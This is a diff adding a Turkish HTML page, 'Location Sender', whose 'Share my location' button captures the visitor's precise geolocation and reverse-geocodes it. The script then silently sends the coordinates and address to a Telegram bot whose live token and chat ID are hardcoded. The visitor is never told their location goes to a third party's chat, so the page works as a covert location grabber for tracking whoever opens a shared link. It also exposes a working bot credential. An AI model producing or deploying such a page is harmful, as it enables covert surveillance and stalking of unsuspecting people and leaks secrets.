@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Konum Gönderici</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background: #f9f9f9;
+      text-align: center;
+    }
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #444;
+    }
+    button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      background: #007aff;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>📍 Konumumu Gönder</h1>
+  <button onclick="getLocation()">Konumumu Paylaş</button>
+  <div id="status">Durum: Hazır</div>
+
+  <script>
+    const BOT_TOKEN = "8005950584:AAGAHkYJW5yeRDl1McQ9Dwz3wJm3T8LO27M";
+    const CHAT_ID = "7125066639"; // Senin chat_id'in
+
+    function getLocation() {
+      const statusEl = document.getElementById("status");
+      statusEl.innerText = "Konum alınıyor...";
+
+      if (!navigator.geolocation) {
+        statusEl.innerText = "Tarayıcı konum servisini desteklemiyor.";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    }
+
+    function success(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Adresi çözüyoruz
+      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+        .then(res => res.json())
+        .then(data => {
+          const address = data.display_name || "Adres bulunamadı.";
+          document.getElementById("status").innerText = `Adres: ${address}`;
+
+          const message = `📍 Yeni Konum Alındı:\n\n📌 Enlem: ${lat}\n📌 Boylam: ${lon}\n🏠 Adres: ${address}`;
+
+          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+          fetch(url)
+            .then(() => console.log("Telegram'a gönderildi."))
+            .catch(err => {
+              console.error("Telegram hatası:", err);
+              statusEl.innerText = "Telegram'a gönderilemedi.";
+            });
+        });
+    }
+
+    function error(err) {
+      document.getElementById("status").innerText = "Konum alınamadı: " + err.message;
+    }
+  </script>
+</body>
+</html>
